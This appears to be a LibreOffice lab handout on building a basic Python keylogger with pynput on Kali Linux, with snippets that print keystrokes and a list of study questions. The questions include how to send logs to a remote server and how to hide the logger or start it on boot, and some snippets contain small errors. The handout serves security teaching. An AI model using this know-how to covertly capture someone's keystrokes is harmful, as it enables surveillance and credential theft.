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Basic Keylogger in Python using Kali Linux</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>1. Understand the Objective</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- A keylogger records all keystrokes entered on a keyboard.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Keyloggers can be local (store data on the machine) or remote (send data to a server or email).</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>2. Install Necessary Library</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Use the `pynput` library, which allows monitoring and controlling the keyboard.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Install the library using:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```bash</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>pip install pynput</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">3. Create a python file</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- In the terminal create a file with the extension .py</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Make sure the 1 line has:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">```bash</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">!/usr/bin/env python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>3. Import the Required Module</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Begin your script by importing the necessary module:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>Import pynput.keyboard</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>4. Create a Keyboard Listener</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/>- Define a listener object to monitor keystrokes:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>Keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>5. Define the Callback Function</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Implement the function to process each key press:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>def process_key_press(key):</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="6"/>print(key)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>6. Start the Listener</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Use a context manager to ensure the listener runs:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>with keyboard_listener:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="6"/>keyboard_listener.join()</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>7. Test the Keylogger</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Run the script:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```bash</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>python keylogger.py</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- Open another terminal or application, type some text, and verify the output is logged.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s/>8. Handle Termination</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">- To stop the keylogger, use a command like `Ctrl+C` in the terminal or kill the Python process:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```bash</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>killall python</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="2"/>```</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s/>9. Questions (Use pynput · PyPI as a resource) :</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">1. What is the primary purpose of a keylogger, and how can it be used in penetration testing?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">2. What is the difference between a local keylogger and a remote keylogger?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">3. What are some ethical and legal considerations when building or using a keylogger?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">4. What is the role of the `pynput` library in building a keylogger?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">5. Why do we need to define a callback function when implementing a keyboard listener?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">6. What does the `on_press` argument in the listener object specify?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">7. How does the `with` statement ensure proper management of the keyboard listener?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">8. Why is it important to include error handling in the `process_key_press` function?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">9. What is the significance of the `listener.join()` method in the script?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">10. How can you test whether your keylogger is capturing keystrokes correctly?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">11. What are some challenges you might encounter when running a keylogger, and how can you troubleshoot them?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">12. How would you stop a running keylogger program if it is set up to run indefinitely?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">13. What steps would you take to modify the keylogger to log keystrokes into a file instead of displaying them on the screen?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">14. How could you enhance this keylogger to send logs to a remote server or email?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">15. What are potential ways to make the keylogger more discreet, such as running it in the background or starting it on system boot?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">16. What are some scenarios where creating a keylogger would be considered unethical or illegal?</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">17. How would you ensure that your keylogger is used responsibly, such as in penetration testing or authorized security assessment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2:14:17.572696072</meta:creation-date>
    <dc:date>2025-09-29T12:15:37.605541591</dc:date>
    <meta:editing-duration>PT1M21S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="76" meta:word-count="498" meta:character-count="3049" meta:non-whitespace-character-count="2546"/>
    <meta:generator>LibreOffice/25.2.6.2$Linux_X86_64 LibreOffice_project/40d1a0e1d5bdf1afaeae24d9ece32bbb00fa66a4</meta:generator>
  </office:meta>
</office:document-meta>
</file>